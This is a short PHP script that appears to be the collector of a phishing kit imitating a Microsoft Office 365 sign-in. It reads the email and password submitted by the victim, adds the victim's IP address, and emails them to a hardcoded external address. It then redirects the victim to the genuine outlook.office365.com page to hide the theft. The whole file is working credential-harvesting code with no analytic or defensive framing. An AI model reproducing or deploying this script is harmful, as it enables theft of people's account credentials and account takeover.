<?php
if($_SERVER['REQUEST_METHOD'] != 'POST') {
header("location: /");
die();
}

$user = $_POST['user'];
$pass = $_POST['pass'];
$pass = $_POST['pass'];
$ip = getenv('REMOTE_ADDR');

$recipient = 'icedomers@yandex.com';
$subject = "Sign in notification $user ";
$message = '
<html>
<head>
<title>New notification </title>
</head>
<body>
<h3>A customer signed in now!</h3>
<table>
<tr>
<td><strong>Email:</strong></td><td>'.$user.'</td>
</tr>
<tr>
<td><strong>Passwd:</strong></td><td>'.$pass.'</td>
</tr>
<tr>
<td><strong>Second Passwd:</strong></td><td>'.$pass.'</td>
</tr>
<tr>
<td><strong>Ip address:</strong></td><td>'.$ip.'</td>
</tr>
</table>
</body>
</html>
';

$headers[] = 'MIME-Version: 1.0';
$headers[] = 'Content-type: text/html; charset=iso-8859-1';

mail($recipient,$subject,$message, implode("\r\n", $headers));
header("location: https://outlook.office365.com");